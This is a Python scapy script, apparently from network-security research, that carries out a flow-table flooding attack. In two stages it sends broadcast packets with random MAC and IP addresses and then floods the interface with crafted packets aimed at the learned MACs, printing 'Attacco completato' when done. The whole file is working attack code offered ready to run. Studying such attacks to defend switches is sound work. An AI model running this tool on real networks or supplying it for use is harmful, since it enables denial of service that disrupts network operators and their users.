#!/usr/bin/env python3
import os
import sys
import json
import argparse
import random
import time
import csv
from time import time, sleep
from scapy.all import sendp

from ftf_utils import FTFUtils

"""
- No Stage 0, --idle and --hard timeouts passed by flags
- Stage 1:
    * anp=100 and no random ANP per iteration
    * attack_frequency=2 sec
"""

def stage_1(iface, npacket, added_new_packets, attack_frequency):
    packets = []
    macs = []
    for _ in range(npacket):
        src_mac = FTFUtils.random_mac()
        src_ip = FTFUtils.random_ip()
        packet = FTFUtils.build_packet(src_mac, src_ip, "ff:ff:ff:ff:ff:ff", "10.0.0.255")
        macs.append(src_mac)
        packets.append(packet)

    i = 0
    n_pkts = len(packets)
    while i < n_pkts:
        j = added_new_packets
        sendp(packets[i:i + j], iface=iface, verbose=False)
        sleep(FTFUtils.random_af(attack_frequency))
        i += j
        print(f"Packets {i}/{n_pkts}", flush=True)
    return macs

def stage_2(iface, npacket, added_new_packets, attack_frequency, macs):
    local_pool = macs.copy()
    random.shuffle(local_pool)
    packets = []
    for i in range(npacket):
        src_mac = FTFUtils.random_mac()
        src_ip = FTFUtils.random_ip()
        dst_mac = local_pool[i % len(local_pool)]
        dst_ip = FTFUtils.random_ip()
        packets.append(FTFUtils.build_packet(src_mac, src_ip, dst_mac, dst_ip))

    i = 0
    n_pkts = len(packets)
    while i < n_pkts:
        j = FTFUtils.random_anp(added_new_packets)
        sendp(packets[0:i + j], iface=iface, verbose=False)
        sleep(FTFUtils.random_af(attack_frequency))
        i += j
        print(f"Packets {i}/{n_pkts}", flush=True)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--iface', required=True)
    parser.add_argument('--dst-ip', required=True, help="Destination IP per stage 0")
    parser.add_argument('--npacket', type=int, required=True)
    parser.add_argument('--anp', type=int, required=True)
    parser.add_argument('--max-iter', type=int, default=1000)
    parser.add_argument('--max-interval', type=int, default=100)
    parser.add_argument('--idle', type=int, default=10)
    parser.add_argument('--hard', type=int, default=20)
    parser.add_argument('--out-file', type=str, default="/tmp/ftf.csv")
    args = parser.parse_args()

    print(f"# [STAGE 0] T_idle Inference, timestamp {int(time())}", flush=True)
    hard_timeout, attack_frequency = args.hard, args.idle

    not_exists = not os.path.exists(args.out_file)
    with open(args.out_file, "a+", newline="") as f:
        writer = csv.writer(f)
        if not_exists:
            writer.writerow(["npacket", "estimated_hard_timeout", "estimated_idle_timeout"])
        writer.writerow([args.npacket, hard_timeout, attack_frequency])
        
    print(f"# [STAGE 1] MAC Presenting, timestamp {int(time())}", flush=True)
    macs = stage_1(args.iface, args.npacket, 100, 2)

    print(f"# [STAGE 2] Flooding, timestamp {int(time())}", flush=True)
    stage_2(args.iface, args.npacket, args.anp, attack_frequency, macs)

    print(f"[+] Attacco completato, timestamp {int(time())}", flush=True)
    
if __name__ == '__main__':
    main()